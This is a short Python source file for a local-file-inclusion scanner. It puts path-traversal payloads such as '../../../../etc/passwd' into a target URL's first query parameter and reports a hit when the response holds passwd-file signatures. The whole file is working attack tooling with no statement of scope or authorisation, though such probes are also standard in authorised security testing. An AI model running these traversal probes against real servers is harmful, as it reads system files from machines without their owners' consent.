import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

PATHS = ["../../../../etc/passwd", "../etc/passwd", "/etc/passwd"]

class LFIScanner:
    def __init__(self, url: str, timeout: float = 8.0):
        self.url = url
        self.timeout = timeout

    def _probe(self, url: str, payload: str):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if not qs:
            return None
        # try inject into first param
        key = list(qs.keys())[0]
        qs[key] = [quote(payload)]
        new_url = urlunparse(parsed._replace(query=urlencode({k:v[0] for k,v in qs.items()})))
        try:
            r = requests.get(new_url, timeout=self.timeout)
            if "root:x:0:0" in r.text or "bin/bash" in r.text:
                return {"url": new_url, "payload": payload, "possible_lfi": True}
        except Exception:
            pass
        return None

    def run(self):
        findings = []
        for p in PATHS:
            res = self._probe(self.url, p)
            if res:
                findings.append(res)
        return findings
